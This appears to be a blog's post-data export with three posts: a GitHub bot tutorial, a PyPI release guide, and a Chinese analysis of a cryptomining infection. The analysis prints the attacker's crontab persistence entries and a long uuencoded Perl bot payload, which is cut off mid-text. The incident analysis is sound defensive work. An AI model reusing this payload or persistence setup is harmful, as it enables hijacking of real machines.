src=\"https://i.imgur.com/7G8Zg58.png\"><br><img src=\"https://i.imgur.com/wMZShV5.png\"><br><img src=\"https://i.imgur.com/PtDjJze.png\"><br><img src=\"https://i.imgur.com/DPPEXv2.png\"><br><img src=\"https://i.imgur.com/AgmG33A.png\"></p>\n<h2 id=\"Ref\"><a href=\"#Ref\" class=\"headerlink\" title=\"Ref\"></a>Ref</h2><p><a href=\"https://github-bot-tutorial.readthedocs.io/en/latest/index.html\">https://github-bot-tutorial.readthedocs.io/en/latest/index.html</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Github-Bot\"><a href=\"#Github-Bot\" class=\"headerlink\" title=\"Github Bot\"></a>Github Bot</h1><p>Register <a href=\"https://signup.heroku.com/\">Heroku</a></p>\n<h2 id=\"Local-setting\"><a href=\"#Local-setting\" class=\"headerlink\" title=\"Local setting\"></a>Local setting</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip install gidgethub</span><br></pre></td></tr></table></figure>\n\n<p>get your Github Token</p>\n<p>In Unix &#x2F; Mac OS:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export GH_AUTH=your token</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Local-test\"><a href=\"#Local-test\" class=\"headerlink\" title=\"Local test\"></a>Local test</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> asyncio</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> aiohttp</span><br><span class=\"line\"><span class=\"keyword\">from</span> gidgethub.aiohttp <span class=\"keyword\">import</span> GitHubAPI</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    </span><br><span class=\"line\">   <span class=\"keyword\">async</span> <span class=\"keyword\">with</span> aiohttp.ClientSession() <span class=\"keyword\">as</span> session:</span><br><span class=\"line\">       gh = GitHubAPI(session, <span class=\"string\">&quot;krnick&quot;</span>, oauth_token=os.getenv(<span class=\"string\">&quot;GH_AUTH&quot;</span>))</span><br><span class=\"line\">       </span><br><span class=\"line\">       <span class=\"comment\"># 開啟新的 issue</span></span><br><span class=\"line\">       <span class=\"keyword\">await</span> gh.post(<span class=\"string\">&#x27;/repos/krnick/Github-Bot/issues&#x27;</span>,</span><br><span class=\"line\">             data=&#123;</span><br><span class=\"line\">                 <span class=\"string\">&#x27;title&#x27;</span>: <span class=\"string\">&#x27;Hello Nick&#x27;</span>,</span><br><span class=\"line\">                 <span class=\"string\">&#x27;body&#x27;</span>: <span class=\"string\">&#x27;This is github bot from JunWei&#x27;</span>,</span><br><span class=\"line\">             &#125;)</span><br><span class=\"line\">             </span><br><span class=\"line\">             </span><br><span class=\"line\">        <span class=\"comment\"># 關閉 issue</span></span><br><span class=\"line\">       <span class=\"keyword\">await</span> gh.patch(<span class=\"string\">&#x27;/repos/krnick/Github-Bot/issues/1&#x27;</span>,</span><br><span class=\"line\">             data=&#123;<span class=\"string\">&#x27;state&#x27;</span>: <span class=\"string\">&#x27;closed&#x27;</span>&#125;,</span><br><span class=\"line\">             )</span><br><span class=\"line\"></span><br><span class=\"line\">loop = asyncio.get_event_loop()</span><br><span class=\"line\">loop.run_until_complete(main())</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"deploy\"><a href=\"#deploy\" class=\"headerlink\" title=\"deploy\"></a>deploy</h2><p>create a new APP<br><img src=\"https://i.imgur.com/gzBhd98.png\"><br>auth<br><img src=\"https://i.imgur.com/JBnDaeP.png\"><br>connect Github<br><img src=\"https://i.imgur.com/yGLo7zQ.png\"></p>\n<p><img src=\"https://i.imgur.com/Ni8AacE.png\"></p>\n<p><img src=\"https://i.imgur.com/P2iA4fc.jpg\"><br><img src=\"https://i.imgur.com/KNm6cJ5.png\"></p>\n<hr>\n<p>Creat a new webhook at the repo you want to build</p>\n<p><img src=\"https://i.imgur.com/MpcbHjw.png\"><br><img src=\"https://i.imgur.com/jhyt9Zj.png\"><br><img src=\"https://i.imgur.com/FyljvND.png\"></p>\n<p>Set your key at Heroku</p>\n<p>GH_AUTH</p>\n<p>GH_SECRET</p>\n<h2 id=\"typo-check-repos-example\"><a href=\"#typo-check-repos-example\" class=\"headerlink\" title=\"typo check repos example\"></a>typo check repos example</h2><p><img src=\"https://i.imgur.com/1LdIE7z.png\"><br><img src=\"https://i.imgur.com/zUQiEZn.png\"><br><img src=\"https://i.imgur.com/7G8Zg58.png\"><br><img src=\"https://i.imgur.com/wMZShV5.png\"><br><img src=\"https://i.imgur.com/PtDjJze.png\"><br><img src=\"https://i.imgur.com/DPPEXv2.png\"><br><img src=\"https://i.imgur.com/AgmG33A.png\"></p>\n<h2 id=\"Ref\"><a href=\"#Ref\" class=\"headerlink\" title=\"Ref\"></a>Ref</h2><p><a href=\"https://github-bot-tutorial.readthedocs.io/en/latest/index.html\">https://github-bot-tutorial.readthedocs.io/en/latest/index.html</a></p>\n"},{"title":"How to draft a new release on PyPi with Github Action","date":"2021-10-07T06:54:14.000Z","_content":"\n# How to draft a new release on PyPi with Github Action\n\nAfter updating the version from everywhere in the codebase such as [`__init__.py`](https://github.com/quark-engine/quark-engine/blob/master/quark/__init__.py), [`docs`](https://github.com/quark-engine/quark-engine/blob/245c77c1e1dc9599bae1be0a76a13ebe86c58549/docs/source/conf.py#L25) and [`debian package`](https://github.com/quark-engine/quark-engine/blob/245c77c1e1dc9599bae1be0a76a13ebe86c58549/debian/control#L20), you can click \"Releases\" for drafting a new version release.\n\n![](https://i.imgur.com/c7JO72j.png)\n\nAfter that, you can click the \"Draft a new release\".\n\n![](https://i.imgur.com/bnApXxl.png)\n\nThe next step is to fill out the version number you want to release, and the changelog from the last release to now.\n\n![](https://i.imgur.com/CzMaMTw.png)\n\nAfter completing the information for this version, you can click \"Publish release\" to publish this version.\n\n![](https://i.imgur.com/B3DXFpW.png)\n\nOnce this version is released, [Github Action](https://github.com/quark-engine/quark-engine/actions/workflows/pythonpublish.yml) will initiate a process to publish it on PyPi automatically.\n\n![](https://i.imgur.com/mbMR7Uo.png)\n\n:::info\nPlease note that there is a limitation that you cannot upload twice with the same release version number.\n\n\n","source":"_posts/How-to-draft-a-new-release-on-PyPi-with-Github-Action.md","raw":"---\ntitle: How to draft a new release on PyPi with Github Action\ndate: 2021-10-07 14:54:14\ntags:\n- python\n- github\n- pypi\n---\n\n# How to draft a new release on PyPi with Github Action\n\nAfter updating the version from everywhere in the codebase such as [`__init__.py`](https://github.com/quark-engine/quark-engine/blob/master/quark/__init__.py), [`docs`](https://github.com/quark-engine/quark-engine/blob/245c77c1e1dc9599bae1be0a76a13ebe86c58549/docs/source/conf.py#L25) and [`debian package`](https://github.com/quark-engine/quark-engine/blob/245c77c1e1dc9599bae1be0a76a13ebe86c58549/debian/control#L20), you can click \"Releases\" for drafting a new version release.\n\n![](https://i.imgur.com/c7JO72j.png)\n\nAfter that, you can click the \"Draft a new release\".\n\n![](https://i.imgur.com/bnApXxl.png)\n\nThe next step is to fill out the version number you want to release, and the changelog from the last release to now.\n\n![](https://i.imgur.com/CzMaMTw.png)\n\nAfter completing the information for this version, you can click \"Publish release\" to publish this version.\n\n![](https://i.imgur.com/B3DXFpW.png)\n\nOnce this version is released, [Github Action](https://github.com/quark-engine/quark-engine/actions/workflows/pythonpublish.yml) will initiate a process to publish it on PyPi automatically.\n\n![](https://i.imgur.com/mbMR7Uo.png)\n\n:::info\nPlease note that there is a limitation that you cannot upload twice with the same release version number.\n\n\n","slug":"How-to-draft-a-new-release-on-PyPi-with-Github-Action","published":1,"updated":"2023-04-20T07:41:28.342Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clgotepmy000ei7ridwop26es","content":"<h1 id=\"How-to-draft-a-new-release-on-PyPi-with-Github-Action\"><a href=\"#How-to-draft-a-new-release-on-PyPi-with-Github-Action\" class=\"headerlink\" title=\"How to draft a new release on PyPi with Github Action\"></a>How to draft a new release on PyPi with Github Action</h1><p>After updating the version from everywhere in the codebase such as <a href=\"https://github.com/quark-engine/quark-engine/blob/master/quark/__init__.py\"><code>__init__.py</code></a>, <a href=\"https://github.com/quark-engine/quark-engine/blob/245c77c1e1dc9599bae1be0a76a13ebe86c58549/docs/source/conf.py#L25\"><code>docs</code></a> and <a href=\"https://github.com/quark-engine/quark-engine/blob/245c77c1e1dc9599bae1be0a76a13ebe86c58549/debian/control#L20\"><code>debian package</code></a>, you can click “Releases” for drafting a new version release.</p>\n<p><img src=\"https://i.imgur.com/c7JO72j.png\"></p>\n<p>After that, you can click the “Draft a new release”.</p>\n<p><img src=\"https://i.imgur.com/bnApXxl.png\"></p>\n<p>The next step is to fill out the version number you want to release, and the changelog from the last release to now.</p>\n<p><img src=\"https://i.imgur.com/CzMaMTw.png\"></p>\n<p>After completing the information for this version, you can click “Publish release” to publish this version.</p>\n<p><img src=\"https://i.imgur.com/B3DXFpW.png\"></p>\n<p>Once this version is released, <a href=\"https://github.com/quark-engine/quark-engine/actions/workflows/pythonpublish.yml\">Github Action</a> will initiate a process to publish it on PyPi automatically.</p>\n<p><img src=\"https://i.imgur.com/mbMR7Uo.png\"></p>\n<p>:::info<br>Please note that there is a limitation that you cannot upload twice with the same release version number.</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"How-to-draft-a-new-release-on-PyPi-with-Github-Action\"><a href=\"#How-to-draft-a-new-release-on-PyPi-with-Github-Action\" class=\"headerlink\" title=\"How to draft a new release on PyPi with Github Action\"></a>How to draft a new release on PyPi with Github Action</h1><p>After updating the version from everywhere in the codebase such as <a href=\"https://github.com/quark-engine/quark-engine/blob/master/quark/__init__.py\"><code>__init__.py</code></a>, <a href=\"https://github.com/quark-engine/quark-engine/blob/245c77c1e1dc9599bae1be0a76a13ebe86c58549/docs/source/conf.py#L25\"><code>docs</code></a> and <a href=\"https://github.com/quark-engine/quark-engine/blob/245c77c1e1dc9599bae1be0a76a13ebe86c58549/debian/control#L20\"><code>debian package</code></a>, you can click “Releases” for drafting a new version release.</p>\n<p><img src=\"https://i.imgur.com/c7JO72j.png\"></p>\n<p>After that, you can click the “Draft a new release”.</p>\n<p><img src=\"https://i.imgur.com/bnApXxl.png\"></p>\n<p>The next step is to fill out the version number you want to release, and the changelog from the last release to now.</p>\n<p><img src=\"https://i.imgur.com/CzMaMTw.png\"></p>\n<p>After completing the information for this version, you can click “Publish release” to publish this version.</p>\n<p><img src=\"https://i.imgur.com/B3DXFpW.png\"></p>\n<p>Once this version is released, <a href=\"https://github.com/quark-engine/quark-engine/actions/workflows/pythonpublish.yml\">Github Action</a> will initiate a process to publish it on PyPi automatically.</p>\n<p><img src=\"https://i.imgur.com/mbMR7Uo.png\"></p>\n<p>:::info<br>Please note that there is a limitation that you cannot upload twice with the same release version number.</p>\n"},{"title":"Mining malware analysis","date":"2022-04-22T07:17:09.000Z","_content":"\n# Mining malware analysis\n\n```bash=\nnetstat -antp\n```\n\n![](https://i.imgur.com/nkRApHa.png)\n\n大量的 ip 對 107.191.99.95 的 port 80 進行連線，且發現每次重開機後都會重新連線，應該是有開機自啟動。\n\n`107.191.99.95`\n\n![](https://i.imgur.com/GnEg6vz.png)\n\n經調查是門羅幣的挖礦\n\n再來分析，使用的程式 cron\n\nPID 為 1475\n\n\n```bash=\nps -aux |grep 1475 \n```\n\n發現是 ./cron \n\n使用者居然是 test2 (看來是同學帳號亂建立，被暴力入侵而得)\n\n\n```bash=\nfind . -name cron*\n```\n\n找到檔案 cron.d\n\n![](https://i.imgur.com/Gb4mMEM.png)\n\n/home/test2/.firefoxcatche/cron.d\n\n```shell=\n* */12 * * * /home/test2/.firefoxcatche/a/upd>/dev/null 2>&1\n@reboot /home/test2/.firefoxcatche/a/upd>/dev/null 2>&1\n5 8 * * 0 /home/test2/.firefoxcatche/b/sync>/dev/null 2>&1\n@reboot /home/test2/.firefoxcatche/b/sync>/dev/null 2>&1  \n#5 1 * * * /tmp/.X13-unix/.rsync/c/aptitude>/dev/null 2>&1\n\n```\n\n\ntest2 帳號的 crontab\n\n![](https://i.imgur.com/b5yebu5.png)\n\n\n被放了什麼東西進來\n\n![](https://i.imgur.com/TeZPyGv.png)\n\n\n主要的惡意程式邏輯應該在 .firefoxcatche\n\n\n![](https://i.imgur.com/gQbEd8g.png)\n\n\n\ncron.d 是最後要執行的程式\n\n![](https://i.imgur.com/hxyv055.png)\n\n會執行 \n\na/upd\n@reboot 後 a/upd\n\nb/sync\n@reboot 後 b/sync\n\n/tmp/.X13-unix/.rsync/c/aptitude\n\n\n先來看 a 資料夾\n\n\n![](https://i.imgur.com/4omAw3I.png)\n\na/a\n\n![](https://i.imgur.com/YxI5D8p.png)\n\na/upd\n\n![](https://i.imgur.com/LoWQJ9U.png)\n\na/stop\n\n![](https://i.imgur.com/dxkmnum.png)\n\na/run\n\n![](https://i.imgur.com/NZy6EmR.png)\n\n\na/init0\n\n看起來是自毀程式\n\n![](https://i.imgur.com/iYZIrHO.png)\n\n\n最後會執行 anacron 這個執行檔案\n\n\n\n再來是 b 資料夾\n\n![](https://i.imgur.com/zDc1NE8.png)\n\n\nb/a\n\n![](https://i.imgur.com/kqS6OOl.png)\n\n\nb/sync\n\n![](https://i.imgur.com/H6Hdy2a.png)\n\n\nb/ps\n\n二進位執行檔案\n\nb/rsync\n\n![](https://i.imgur.com/nQgpx0Z.png)\n\n```perl\neval unpack u=>q{_\"FUY(\"1P<F]C97-S;R`](\"=R<WEN8R<[\"@HD<V5R=FED;W(])S4N,C4U+C@V+C$R.2<@=6YL97-S(\"1S97)V_:61O<CL*;7D@)'!O<G1A/2<T-#,G.PIM>2!`8V%N86ES/2@B(S`P-R(I.PIM>2!`861M<STH(D$B+\")8(BD[_\"FUY($!A=71H/2@B;&]C86QH;W-T(BD[\"@IM>2`D;&EN87-?;6%X/38[\"FUY(\"1S;&5E<#TS.PH*;7D@)&YI_8VL@/2!G971N:6-K*\"D[\"FUY(\"1I<F-N86UE(#T@9V5T;FEC:R@I.PIM>2`D<F5A;&YA;64@/2`H8'5N86UE_(\"UA8\"D[\"@IM>2`D86-E<W-O<VAE;&P@/2`Q.PIM>2`D<')E9FEX;R`](\"(A(\"([\"FUY(\"1E<W1A=&ES=&EC_87,@/2`P.PIM>2`D<&%C;W1E<R`](#$[\"@IM>2`D5D524T%/(#T@)S`N,F$G.PH*)%-)1WLG24Y4)WT@/2`G_24=.3U)%)SL*)%-)1WLG2%50)WT@/2`G24=.3U)%)SL*)%-)1WLG5$5232=](#T@)TE'3D]212<[\"B1324=[_)T-(3$0G?2`](\"=)1TY/4D4G.PHD4TE'>R=04R=](#T@)TE'3D]212<[\"@IU<V4@24\\Z.E-O8VME=#L*=7-E_(%-O8VME=#L*=7-E($E/.CI396QE8W0[\"F-H9&ER*\"(O(BD[\"B1S97)V:61O<CTB)$%21U9;,%TB(&EF(\"1!_4D=66S!=.PHD,#TB)'!R;V-E<W-O(BXB7#`B.PIM>2`D<&ED/69O<FL[\"F5X:70@:68@)'!I9#L*9&EE(\")0_<F]B;&5M82!C;VT@;R!F;W)K.B`D(2(@=6YL97-S(&1E9FEN960H)'!I9\"D[\"@IM>2`E:7)C7W-E<G9E<G,[_\"FUY(\"5$0T,[\"FUY(\"1D8V-?<V5L(#T@;F5W($E/.CI396QE8W0M/FYE=R@I.PH*\"@H*<W5B(&=E=&YI8VL@_>PH@(')E='5R;B`B>\"(N:6YT*')A;F0H.3`P,\"DI.PI]\"@H*<W5B(&=E=&ED96YT('L*(\"!M>2`D<F5T;W)N_;VED96YT(#T@)E]G970H(FAT='`Z+R]W=W<N;6EN<&]P+F-O;2]S:S$R<&%C:R]I9&5N=',N<&AP(BD[\"B`@_;7D@)&ED96YT8VAA;F-E(#T@:6YT*')A;F0H,3`P,\"DI.PH@(&EF(\"@D:61E;G1C:&%N8V4@/B`S,\"D@>PH@_(\"`@(')E='5R;B`D;FEC:SL*(\"!](&5L<V4@>PH@(\"`@(')E='5R;B`D<F5T;W)N;VED96YT.PH@('T*(\"!R_971U<FX@)')E=&]R;F]I9&5N=#L*?0H*<W5B(&=E=&YA;64@>PH@(&UY(\"1R971O<FYO;F%M92`](\"9?9V5T_*\")H='1P.B\\O=W=W+FUI;G!O<\"YC;VTO<VLQ,G!A8VLO;F%M97,N<&AP(BD[\"B`@<F5T=7)N(\"1R971O<FYO_;F%M93L*?0H*<W5B(&=E=&ED96YT,B![\"B`@(\"`@(\"`@;7D@)&QE;F=T:#US:&EF=#L*(\"`@(\"`@(\"`D;&5N_9W1H(#T@,R!I9B`H)&QE;F=T:\"`\\(#,I.PH*(\"`@(\"`@(\"!M>2!`8VAA<G,]*\"=A)RXN)WHG+\"=!)RXN)UHG_+\"<Q)RXN)SDG*3L*(\"`@(\"`@(\"!F;W)E86-H(\"@Q+BXD;&5N9W1H*0H@(\"`@(\"`@('L*(\"`@(\"`@(\"`@(\"`@_(\"`@(\"1R86YD;VUS=')I;F<N/21C:&%R<UMR86YD($!C:&%R<UT[\"B`@(\"`@(\"`@?0H@(\"`@(\"`@(')E='5R_;B`D<F%N9&]M<W1R:6YG.PI]\"@IS=6(@9V5T<W1O<F4@*\"0D*0I[\"B`@;7D@)'5R;\"`]('-H:69T.PH@(&UY_(\"1F:6QE(#T@<VAI9G0[\"@H@(\"1H='1P7W-T<F5A;5]O=70@/2`Q.PH@(&]P96XH1T547T]55$9)3$4L(\"(^_(\"1F:6QE(BD[\"B`@)6AT='!?;&]O<%]C:&5C:R`](\"@I.PH@(%]G970H)'5R;\"D[\"B`@8VQO<V4@1T547T]5_5$9)3$4[\"B`@<F5T=7)N(\"1M86EN.CIH='1P7V=E=%]R97-U;'0[\"GT*\"G-U8B!?9V5T\"GL*(\"!M>2`D=7)L_(#T@<VAI9G0[\"B`@;7D@)'!R;WAY(#T@(B([\"B`@9W)E<\"![*&QC*\"1?*2!E<2`B:'1T<%]P<F]X>2(I(\"8F_(\"@D<')O>'D@/2`D14Y6>R1??2E](&ME>7,@)45.5CL*(\"!I9B`H*\"1P<F]X>2!E<2`B(BD@)B8@)'5R;\"`]_?B!M+%YH='1P.B\\O*%M>+SI=*RDH/SHZ*%QD*RDI/R@O7%,J*3\\D+\"D@>PH@(\"`@;7D@)&AO<W0@/2`D,3L*_(\"`@(&UY(\"1P;W)T(#T@)#(@?'P@.#`[\"B`@(\"!M>2`D<&%T:\"`](\"0S.PH@(\"`@)'!A=&@@/2`B+R(@=6YL_97-S(&1E9FEN960H)'!A=&@I.PH@(\"`@<F5T=7)N(%]T<FEV:6%L7VAT='!?9V5T*\"1H;W-T+\"`D<&]R=\"P@_)'!A=&@I.PH@('T@96QS:68@*\"1P<F]X>2`]?B!M+%YH='1P.B\\O*%M>+SI=*RDZ*%QD*RDH+UQ3*BD_)\"PI_('L*(\"`@(&UY(\"1H;W-T(#T@)#$[\"B`@(\"!M>2`D<&]R=\"`](\"0R.PH@(\"`@;7D@)'!A=&@@/2`D=7)L.PH@_(\"`@<F5T=7)N(%]T<FEV:6%L7VAT='!?9V5T*\"1H;W-T+\"`D<&]R=\"P@)'!A=&@I.PH@('T@96QS92![\"B`@_(\"!R971U<FX@=6YD968[\"B`@?0I]\"@H*<W5B(%]T<FEV:6%L7VAT='!?9V5T\"GL*(\"!M>2@D:&]S=\"P@)'!O_<G0L(\"1P871H*2`]($!?.PH@(&UY*\"1!1T5.5\"P@)%9%4E-)3TXL(\"1P*3L*\"B`@)$%'14Y4(#T@(F=E=\"UM_:6YI;6%L(CL*(\"`D5D524TE/3B`](\"(R,#`P,#$Q.\"([\"@H@(\"1P871H(#U^(',O(\"\\E,C`O9SL*\"B`@<F5Q_=6ER92!)3SHZ4V]C:V5T.PH@(&QO8V%L*\"1>5RD@/2`P.PH@(&UY(\"1S;V-K(#T@24\\Z.E-O8VME=#HZ24Y%_5\"T^;F5W*%!E97)!9&1R(#T^(\"1H;W-T+`H@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@(%!E_97)0;W)T(#T^(\"1P;W)T+`H@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@(%!R;W1O(\"`@/3X@_)W1C<\"<L\"B`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@5&EM96]U=\"`@/3X@-C`I('Q\\(')E_='5R;CL*(\"`D<V]C:RT^875T;V9L=7-H.PH@(&UY(\"1N971L;V,@/2`D:&]S=#L*(\"`D;F5T;&]C(\"X](\"(Z_)'!O<G0B(&EF(\"1P;W)T(\"$](#@P.PH@(&UY(\"1R97%U97-T(#T@(D=%5\"`D<&%T:\"!(5%10+S$N,%PP,35<_,#$R(@H@(\"`@(\"`@(\"`@(\"`@(\"X@(DAO<W0Z(\"1N971L;V-<,#$U7#`Q,B(*(\"`@(\"`@(\"`@(\"`@(\"`N(\")5_<V5R+4%G96YT.B`D04=%3E0O)%9%4E-)3TXO=5PP,35<,#$R(CL*(\"`D<F5Q=65S=\"`N/2`B4')A9VUA.B!N_;RUC86-H95PP,35<,#$R(B!I9B`H)&UA:6XZ.FAT='!?;F]?8V%C:&4I.PH@(\"1R97%U97-T(\"X](\")<,#$U_7#`Q,B([\"B`@<')I;G0@)'-O8VL@)')E<75E<W0[\"@H@(&UY(\"1B=68@/2`B(CL*(\"!M>2`D;CL*(\"!M>2`D_8C$@/2`B(CL*(\"!W:&EL92`H)&X@/2!S>7-R96%D*\"1S;V-K+\"`D8G5F+\"`X*C$P,C0L(&QE;F=T:\"@D8G5F_*2DI('L*(\"`@(&EF(\"@D8C$@97$@(B(I('L@\"B`@(\"`@(\"1B,2`](\"1B=68[(\"`@(\"`@(\"`@\"B`@(\"`@(\"1B_=68@/7X@<R\\N*S]<,#$U/UPP,3)<,#$U/UPP,3(O+W,[(\"`@(\"`@\"B`@(\"!]\"B`@(\"!I9B`H)&AT='!?<W1R_96%M7V]U=\"D@>R!P<FEN=\"!'151?3U541DE,12`D8G5F.R`D8G5F(#T@(B([('T*(\"!]\"B`@<F5T=7)N('5N_9&5F('5N;&5S<R!D969I;F5D*\"1N*3L*\"B`@)&UA:6XZ.FAT='!?9V5T7W)E<W5L=\"`](#(P,#L*(\"!I9B`H_)&(Q(#U^(&TL7DA45%`O7&0K7\"Y<9\"M<<RLH7&0K*5M>7#`Q,ETJ7#`Q,BPI('L*(\"`@(\"1M86EN.CIH='1P_7V=E=%]R97-U;'0@/2`D,3L*(\"`@(&EF(\"@D;6%I;CHZ:'1T<%]G971?<F5S=6QT(#U^(\"]>,S!;,3(S-UTO_(\"8F(\"1B,2`]?B`O7#`Q,DQO8V%T:6]N.EQS*BA<4RLI+PHI('L*(\"`@(\"`@;7D@)'5R;\"`](\"0Q.PH@(\"`@_(\"!R971U<FX@=6YD968@:68@)&AT='!?;&]O<%]C:&5C:WLD=7)L?2LK.PH@(\"`@(\"!R971U<FX@7V=E=\"@D_=7)L*3L*(\"`@('T*(\"`@(')E='5R;B!U;F1E9B!U;FQE<W,@)&UA:6XZ.FAT='!?9V5T7W)E<W5L=\"`]?B`O_7C(O.PH@('T*\"B`@<F5T=7)N(\"1B=68[\"GT*\"@HD<V5L7V-L:65N=&4@/2!)3SHZ4V5L96-T+3YN97<H*3L*_<W5B('-E;F1R87<@>PH@(&EF(\"@D(U\\@/3T@)S$G*2![\"B`@(\"!M>2`D<V]C:V5T(#T@)%];,%T[\"B`@(\"!P_<FEN=\"`D<V]C:V5T(\"(D7ULQ75QN(CL*(\"!](&5L<V4@>PH@(\"`@(\"!P<FEN=\"`D25)#7V-U<E]S;V-K970@_(B1?6S!=7&XB.PH@('T*?0H*<W5B(&-O;F5C=&%R('L*(\"`@;7D@)&UE=6YI8VL@/2`D7ULP73L*(\"`@;7D@_)'-E<G9I9&]R7V-O;B`](\"1?6S%=.PH@(\"!M>2`D<&]R=&%?8V]N(#T@)%];,ET[\"@H@(\"!M>2`D25)#7W-O_8VME=\"`]($E/.CI3;V-K970Z.DE.150M/FYE=RA0<F]T;ST^(G1C<\"(L(%!E97)!9&1R/3XB)'-E<G9I9&]R_7V-O;B(L(%!E97)0;W)T/3XD<&]R=&%?8V]N*2!O<B!R971U<FXH,2D[\"B`@(&EF(\"AD969I;F5D*\"1)4D-?_<V]C:V5T*2D@>PH@(\"`@(\"1)4D-?8W5R7W-O8VME=\"`](\"1)4D-?<V]C:V5T.PH*(\"`@(\"`D25)#7W-O8VME_=\"T^875T;V9L=7-H*#$I.PH@(\"`@(\"1S96Q?8VQI96YT92T^861D*\"1)4D-?<V]C:V5T*3L*\"B`@(\"`@)&ER_8U]S97)V97)S>R1)4D-?8W5R7W-O8VME='U[)VAO<W0G?2`](\"(D<V5R=FED;W)?8V]N(CL*(\"`@(\"`D:7)C_7W-E<G9E<G-[)$E20U]C=7)?<V]C:V5T?7LG<&]R=&$G?2`](\"(D<&]R=&%?8V]N(CL*(\"`@(\"`D:7)C7W-E_<G9E<G-[)$E20U]C=7)?<V]C:V5T?7LG;FEC:R=](#T@)&UE=6YI8VL[\"B`@(\"`@)&ER8U]S97)V97)S>R1)_4D-?8W5R7W-O8VME='U[)VUE=6EP)WT@/2`D25)#7W-O8VME=\"T^<V]C:VAO<W0[\"B`@(\"`@;FEC:R@B)&UE_=6YI8VLB*3L*(\"`@(\"!S96YD<F%W*\")54T52(\"1I<F-N86UE(\"(N)$E20U]S;V-K970M/G-O8VMH;W-T+B(@_)'-E<G9I9&]R7V-O;B`Z)')E86QN86UE(BD[\"B`@(\"`@<VQE97`@,CL*(\"`@?0H*?0IM>2`D;&EN95]T96UP_.PIW:&EL92@@,2`I('L*(\"`@=VAI;&4@*\"$H:V5Y<R@E:7)C7W-E<G9E<G,I*2D@>R!C;VYE8W1A<B@B)&YI_8VLB+\"`B)'-E<G9I9&]R(BP@(B1P;W)T82(I.R!]\"B`@(&1E;&5T92@D:7)C7W-E<G9E<G-[)R=]*2!I9B`H_9&5F:6YE9\"@D:7)C7W-E<G9E<G-[)R=]*2D[\"B`@(\"9$0T,Z.F-O;FYE8W1I;VYS.PH@(\"!M>2!`<F5A9'D@_/2`D<V5L7V-L:65N=&4M/F-A;E]R96%D*#`N-BD[\"B`@(&YE>'0@=6YL97-S*$!R96%D>2D[\"B`@(&9O<F5A_8V@@)&9H(\"A`<F5A9'DI('L*(\"`@(\"`D25)#7V-U<E]S;V-K970@/2`D9F@[\"B`@(\"`@)&UE=6YI8VL@/2`D_:7)C7W-E<G9E<G-[)$E20U]C=7)?<V]C:V5T?7LG;FEC:R=].PH@(\"`@(\"1N<F5A9\"`]('-Y<W)E860H)&9H_+\"`D;7-G+\"`T,#DV*3L*(\"`@(\"!I9B`H)&YR96%D(#T](#`I('L*(\"`@(\"`@(\"`D<V5L7V-L:65N=&4M/G)E_;6]V92@D9F@I.PH@(\"`@(\"`@(\"1F:\"T^8VQO<V4[\"B`@(\"`@(\"`@9&5L971E*\"1I<F-?<V5R=F5R<WLD9FA]_*3L*(\"`@(\"!]\"B`@(\"`@0&QI;F5S(#T@<W!L:70@*\"]<;B\\L(\"1M<V<I.PH*(\"`@(\"!F;W(H;7D@)&,],#L@_)&,\\/2`D(VQI;F5S.R`D8RLK*2![\"B`@(\"`@(\"`D;&EN92`](\"1L:6YE<ULD8UT[\"B`@(\"`@(\"`D;&EN93TD_;&EN95]T96UP+B1L:6YE(&EF(\"@D;&EN95]T96UP*3L*(\"`@(\"`@(\"1L:6YE7W1E;7`])R<[\"B`@(\"`@(\"`D_;&EN92`]?B!S+UQR)\"\\O.PH@(\"`@(\"`@=6YL97-S(\"@D8R`]/2`D(VQI;F5S*2![\"B`@(\"`@(\"`@('!A<G-E_*\"(D;&EN92(I.PH@(\"`@(\"`@?2!E;'-E('L*(\"`@(\"`@(\"`@(\"!I9B`H)\"-L:6YE<R`]/2`P*2![\"B`@(\"`@_(\"`@(\"`@(\"!P87)S92@B)&QI;F4B*3L*(\"`@(\"`@(\"`@(\"!](&5L<VEF(\"@D;&EN97-;)&-=(#U^(\"]<<B0O_*2![\"B`@(\"`@(\"`@(\"`@(\"`@('!A<G-E*\"(D;&EN92(I.PH@(\"`@(\"`@(\"`@('T@96QS:68@*\"1L:6YE(#U^_(\"]>*%Q3*RD@3D]424-%($%55$@@.EPJ7\"I<*B\\I('L*(\"`@(\"`@(\"`@(\"`@(\"`@<&%R<V4H(B1L:6YE(BD[_\"B`@(\"`@(\"`@(\"`@?2!E;'-E('L*(\"`@(\"`@(\"`@(\"`@(\"`@)&QI;F5?=&5M<\"`](\"1L:6YE.PH@(\"`@(\"`@_(\"`@('T*(\"`@